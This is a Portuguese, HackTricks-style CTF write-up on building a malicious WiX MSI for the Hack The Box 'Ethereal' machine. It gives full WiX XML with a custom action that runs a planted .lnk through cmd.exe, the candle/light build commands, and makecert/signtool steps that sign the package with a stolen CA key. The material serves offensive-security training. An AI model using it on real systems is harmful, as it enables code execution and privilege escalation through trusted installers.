# Criando um MSI com Custom-Action usando WiX

{{#include ../../banners/hacktricks-training.md}}

Esta cadeia histórica do Hack The Box usou o WiX Toolset v3 para criar um MSI que executava um arquivo `.lnk` previamente implantado. **Um MSI não possui privilégios automaticamente**: a execução ocorre no contexto selecionado pela política do Windows Installer, pelos atributos da custom-action e por quem o instala. No cenário citado, o atacante também roubou uma CA de assinatura confiável e colocou o MSI assinado em uma pasta monitorada por outro usuário.<sup>[[1]](#references)[[3]](#references)</sup>

Para uma compreensão abrangente dos exemplos de uso de MSI com WiX, é recomendável consultar [esta página](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Nela, você encontrará vários exemplos que demonstram o uso de MSI com WiX.<sup>[[2]](#references)</sup>

O MSI executa `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. O XML original do WiX v3 é preservado abaixo:<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion` declara a versão mínima do Windows Installer, e `Compressed="yes"` indica que o pacote está compactado. `Stage1` é adiado, mas possui `Impersonate="yes"`, portanto é executado com o token personificado do usuário que está instalando; a mudança de privilégio nesse cenário veio do usuário privilegiado que abriu o MSI posteriormente, não desse atributo concedendo SYSTEM magicamente.<sup>[[3]](#references)</sup>

Compile o código-fonte em um objeto WiX com `candle.exe`:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
Vincule esse objeto a um MSI com `light.exe`:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### Etapa de assinatura usada na cadeia original

O fluxo de trabalho alvo aceitava pacotes assinados por uma CA interna comprometida. O relato derivou um certificado de assinatura a partir de `MyCA.cer`/`MyCA.pvk` recuperados, criou um PFX e assinou o MSI:<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
O atacante então colocou o pacote assinado em `D:\DEV\MSIs` e aguardou que o workflow/usuário privilegiado o executasse. Preserve essa pré-condição ao adaptar a técnica: sem um caminho de instalação elevado, uma policy insegura como `AlwaysInstallElevated` ou uma vítima privilegiada, esse pacote será executado apenas com os direitos do usuário atual.

## References

- [1] [Hack The Box - Ethereal: Criando um MSI malicioso e obtendo root - Blog do 0xRick](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [Uma introdução rápida: criar um instalador MSI com WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Custom actions de execução adiada (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
